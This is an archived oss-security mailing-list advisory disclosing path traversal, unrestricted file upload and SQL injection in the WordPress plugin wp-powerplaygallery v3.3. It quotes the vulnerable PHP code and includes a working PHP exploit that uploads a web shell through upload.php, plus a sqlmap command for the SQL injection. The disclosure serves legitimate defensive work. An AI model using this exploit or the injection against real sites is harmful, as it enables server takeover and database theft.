X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4506" "Sunday" "12" "July" "2015" "16:11:38" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<4B83BB8E-8197-4530-816A-EF48BD586D89@me.com>" "112" "[oss-security] Remote file upload vulnerability & SQLi in wordpress plugin wp-powerplaygallery v3.3" nil nil nil "7" "2015071220:11:38" "[oss-security] Remote file upload vulnerability & SQLi in wordpress plugin wp-powerplaygallery v3.3" (number mark "        larry0@me.co Jul 12  112/4506  " thread-indent "\"[oss-security] Remote file upload vulnerability & SQLi in wordpress plugin wp-powerplaygallery v3.3\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 19863 invoked by uid 550); 12 Jul 2015 20:11:56 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 19811 invoked from network); 12 Jul 2015 20:11:49 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-07-12_12:2015-07-11,2015-07-12,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1507120349
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <4B83BB8E-8197-4530-816A-EF48BD586D89@me.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
X-Mailer: Apple Mail (2.2098)
Date: Sun, 12 Jul 2015 16:11:38 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Remote file upload vulnerability & SQLi in wordpress plugin
 wp-powerplaygallery v3.3
To: Open Source Security <oss-security@lists.openwall.com>

Title: Remote file upload vulnerability & SQLi in wordpress plugin wp-power=
playgallery v3.3
Author: Larry W. Cashdollar, @_larry0
Date: 2015-06-27
Download Site: https://wordpress.org/plugins/wp-powerplaygallery
Vendor: WP SlideShow
Vendor Notified: 2015-06-29
Advisory: http://www.vapid.dhs.org/advisory.php?v=3D132
Vendor Contact: plugins@wordpress.org
Description: This is the best gallery for touch screens. It is fully touch =
enabled with great features. This gallery is compatible wiht iphone and ipa=
ds. It is also allow us to use it as a widget.You can also enable this Powe=
rplay Gallery on your wordpress site by placing code snippet in your templa=
te (.php) files. It shows flash gallery for desktops and touch enabled vers=
ion for ipad and iphones.
Vulnerability:
1. Ability to create directories out side of the upload path by using ../:
Lines 56-59 of upload.php:

56 // Create target dir
57 if (!file_exists($targetDir)) {
58         @mkdir($targetDir);
59 }=20=20=20=20=20=20

2. Arbitrary file uploads to a path in the web root directory:
Lines 138-160 of uploads.php don=E2=80=99t verify what types of files are a=
llowed or where they should be placed:

138 // Open temp file
139 if (!$out =3D @fopen("{$filePath}.part", $chunks ? "ab" : "wb")) {
140         die('{"jsonrpc" : "2.0", "error" : {"code": 102, "message": "Fa=
iled to open output stream."}, "id" :     "id"}');
141 }
142=20
143 if (!empty($_FILES)) {
144         if ($_FILES["file"]["error"] || !is_uploaded_file($_FILES["file=
"]["tmp_name"])) {
145                 die('{"jsonrpc" : "2.0", "error" : {"code": 103, "messa=
ge": "Failed to move uploaded file."}    , "id" : "id"}');
146         }
147=20
148         // Read binary input stream and append it to temp file
149         if (!$in =3D @fopen($_FILES["file"]["tmp_name"], "rb")) {
150                 die('{"jsonrpc" : "2.0", "error" : {"code": 101, "messa=
ge": "Failed to open input stream."},     "id" : "id"}');
151         }
152 } else {
153         if (!$in =3D @fopen("php://input", "rb")) {
154                 die('{"jsonrpc" : "2.0", "error" : {"code": 101, "messa=
ge": "Failed to open input stream."},     "id" : "id"}');
155         }
156 }
157=20
158 while ($buff =3D fread($in, 4096)) {
159         fwrite($out, $buff);
160 }

3. Sql injection=20
Lines 131-135 of upload.php fail to handle user input appropriately either =
by sanitizing or paramaterizing it. Injection points are
any GET/POST to albumid or name.

131 $query =3D "INSERT INTO ".$wpdb->prefix."pp_images (`category_id`, `tit=
le`, `description`, `price`, `thumb`, `    image`, `status`, `order`, `crea=
tion_date` )
132           VALUES (".$_REQUEST['albumid'].",'".$imgname[0]."','".$imgnam=
e[0]."','','".$resize."','".$_REQUEST    ['name']."',1,'','NULL')";
133=20
134           $wpdb->query($query);
135=20

CVEID:
OSVDB:
Exploit Code:
	=E2=80=A2 <?php
	=E2=80=A2 /*Remote shell upload exploit for wp-powerplaygallery v3.3 */
	=E2=80=A2 /*Larry W. Cashdollar @_larry0
	=E2=80=A2 6/27/2015
	=E2=80=A2 albumid needs to be a numeric value matching an existing album n=
umber, 1 is probably a good start
	=E2=80=A2 but you can enumerate these by using curl, and looking for redir=
ect 301 responses:
	=E2=80=A2 e.g. $ curl http://www.vapidlabs.com/wp-content/uploads/power_pl=
ay/4_uploadfolder/big
	=E2=80=A2 ->301 exists else 404 doesn't.
	=E2=80=A2 shell is http://www.vapidlabs.com/wp-content/uploads/power_play/=
4_uploadfolder/big/shell.php
	=E2=80=A2 */
	=E2=80=A2=20=20
	=E2=80=A2=20=20
	=E2=80=A2 	$target_url =3D 'http://www.vapidlabs.com/wp-content/plugins/wp=
-powerplaygallery/upload.php';
	=E2=80=A2 	$file_name_with_full_path =3D '/var/www/shell.php';
	=E2=80=A2=20=20
	=E2=80=A2         echo "POST to $target_url $file_name_with_full_path";
	=E2=80=A2 	$post =3D array('albumid'=3D>'foo' , 'name' =3D> 'shell.php','f=
ile'=3D>'@'.$file_name_with_full_path);
	=E2=80=A2=20=20
	=E2=80=A2         $ch =3D curl_init();
	=E2=80=A2 	curl_setopt($ch, CURLOPT_URL,$target_url);
	=E2=80=A2 	curl_setopt($ch, CURLOPT_POST,1);
	=E2=80=A2 	curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	=E2=80=A2         curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
	=E2=80=A2 	$result=3Dcurl_exec ($ch);
	=E2=80=A2 	curl_close ($ch);
	=E2=80=A2         echo "<hr>";
	=E2=80=A2 	echo $result;
	=E2=80=A2         echo "<hr>";
	=E2=80=A2 ?>
SQLi PoC:
$ sqlmap -u http://www.vapidlabs.com/wp-content/plugins/wp-powerplaygallery=
/upload.php --data "albumid=3D1=E2=80=9D  =E2=80=94dbms mysql=
